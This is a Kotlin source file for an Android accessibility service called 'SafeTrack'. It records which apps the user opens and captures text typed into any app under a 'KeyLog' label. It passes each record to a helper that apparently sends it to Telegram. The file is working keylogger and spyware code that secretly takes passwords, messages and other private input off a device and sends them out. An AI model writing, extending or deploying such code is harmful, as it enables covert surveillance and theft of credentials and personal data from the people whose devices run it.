package com.example.safetrack

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SafeTrackAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val packageName = event.packageName?.toString() ?: "Unknown"

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val message = "📱 App Opened: $packageName"
                Log.d("SafeTrack", message)
                sendToTelegram(message)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val typedText = event.text?.joinToString("") ?: ""
                if (typedText.isNotEmpty()) {
                    val message = "⌨️ KeyLog:\nApp: $packageName\nText: $typedText"
                    Log.d("SafeTrack", message)
                    sendToTelegram(message)
                }
            }
        }
    }

    private fun sendToTelegram(message: String) {
        CoroutineScope(Dispatchers.IO).launch {
            TelegramSyncHelper.sendLogData(message)
        }
    }

    override fun onInterrupt() {
        Log.e("SafeTrack", "Accessibility Service Interrupted")
    }
}
